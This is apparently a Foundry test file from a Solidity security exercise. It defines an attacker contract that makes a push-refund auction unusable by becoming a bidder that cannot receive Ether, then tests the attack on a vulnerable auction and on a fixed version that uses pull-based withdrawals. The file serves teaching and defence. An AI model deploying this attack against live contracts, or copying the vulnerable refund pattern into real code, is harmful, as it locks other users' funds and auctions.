// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;
import {VulnerableAuction} from "../../src/dos/VulnerableAuction.sol";
import {VulnerableAuctionFixed} from "../../src/dos/VulnerableAuctionFixed.sol";
import {Test} from "forge-std/Test.sol";

contract AttackAuction {
    address owner;
    VulnerableAuction vulnerableAuction;
    VulnerableAuctionFixed vulnerableAuctionFixed;
    error AttackAuction__NotOwner();

    constructor(
        VulnerableAuction _vulnerableAuction,
        VulnerableAuctionFixed _vulnerableAuctionFixed
    ) {
        owner = msg.sender;
        vulnerableAuction = _vulnerableAuction;
        vulnerableAuctionFixed = _vulnerableAuctionFixed;
    }
    function attack() public payable {
        if (owner == msg.sender) {
            vulnerableAuction.bid{value: msg.value}();
        } else revert AttackAuction__NotOwner();
    }
    function attackFixed() public payable {
        if (owner == msg.sender) {
            vulnerableAuctionFixed.bid{value: msg.value}();
        } else revert AttackAuction__NotOwner();
    }
}

contract VulnerableAuctionTest is Test {
    VulnerableAuction vulnerableAuction;
    VulnerableAuctionFixed vulnerableAuctionFixed;
    AttackAuction attackAuction;
    address USER = makeAddr("user");
    address ATTACKER = makeAddr("attacker");
    address USER2 = makeAddr("user2");

    function setUp() external {
        vm.deal(USER, 5 ether);
        vm.deal(USER2, 5 ether);
        vm.deal(ATTACKER, 5 ether);
        vulnerableAuction = new VulnerableAuction();
        vulnerableAuctionFixed = new VulnerableAuctionFixed();
        vm.prank(ATTACKER);
        attackAuction = new AttackAuction(
            vulnerableAuction,
            vulnerableAuctionFixed
        );
    }
    function testAuction() external {
        vm.prank(USER);
        vulnerableAuction.bid{value: 1 ether}();
        assertEq(1 ether, vulnerableAuction.lastBid());
        assertEq(USER, vulnerableAuction.lastGetter());
        assertEq(4 ether, address(USER).balance);
        vm.prank(USER2);
        vulnerableAuction.bid{value: 2 ether}();
        assertEq(2 ether, vulnerableAuction.lastBid());
        assertEq(USER2, vulnerableAuction.lastGetter());
        assertEq(5 ether, address(USER).balance);
        assertEq(3 ether, address(USER2).balance);
    }
    function testDosAttack() external {
        vm.prank(USER);
        vulnerableAuction.bid{value: 1 ether}();
        assertEq(1 ether, vulnerableAuction.lastBid());
        assertEq(USER, vulnerableAuction.lastGetter());
        vm.prank(ATTACKER);
        attackAuction.attack{value: 2 ether}();
        assertEq(5 ether, USER.balance); //after deposit users have to get their money
        assertEq(2 ether, vulnerableAuction.lastBid());
        assertEq(address(attackAuction), vulnerableAuction.lastGetter());
        vm.prank(USER);
        vm.expectRevert(
            VulnerableAuction.VulnerableAuction__PaymentUnsuccesfull.selector
        );
        vulnerableAuction.bid{value: 3 ether}();
        assertEq(5 ether, USER.balance); //even if user deposit more money balance have to not change
        assertEq(2 ether, vulnerableAuction.lastBid());
        assertEq(2 ether, address(vulnerableAuction).balance);
        assertEq(address(attackAuction), vulnerableAuction.lastGetter()); //still same getter
    }

    //FIXED

    function testDosAttackFixed() external {
        vm.prank(USER);
        vulnerableAuctionFixed.bid{value: 1 ether}();
        assertEq(1 ether, vulnerableAuctionFixed.lastBid());
        assertEq(USER, vulnerableAuctionFixed.lastGetter());
        vm.prank(ATTACKER);
        attackAuction.attackFixed{value: 2 ether}();
        assertEq(4 ether, USER.balance); // bid() para göndermiyor, USER hâlâ 4 ether'de
        assertEq(1 ether, vulnerableAuctionFixed.pendingRefunds(USER)); // alacağı deftere yazıldı
        assertEq(2 ether, vulnerableAuctionFixed.lastBid());
        assertEq(address(attackAuction), vulnerableAuctionFixed.lastGetter());

        vm.prank(USER2);
        vulnerableAuctionFixed.bid{value: 3 ether}(); // revert YOK, artık DoS çalışmıyor
        assertEq(3 ether, vulnerableAuctionFixed.lastBid());
        assertEq(USER2, vulnerableAuctionFixed.lastGetter());
        assertEq(
            2 ether,
            vulnerableAuctionFixed.pendingRefunds(address(attackAuction))
        );
        assertEq(6 ether, address(vulnerableAuctionFixed).balance); // 1 + 2 + 3, kimseye para gitmedi

        uint256 balanceBefore = USER.balance;
        vm.prank(USER);
        vulnerableAuctionFixed.withdraw();
        assertEq(1 ether, USER.balance - balanceBefore); // USER parasını kendisi çekti
        assertEq(0, vulnerableAuctionFixed.pendingRefunds(USER));

        vm.prank(address(attackAuction));
        vm.expectRevert(
            VulnerableAuctionFixed
                .VulnerableAuctionFixed__PaymentUnsuccesfull
                .selector
        );
        vulnerableAuctionFixed.withdraw(); // sadece saldırganın kendi çağrısı revert eder
    }
}
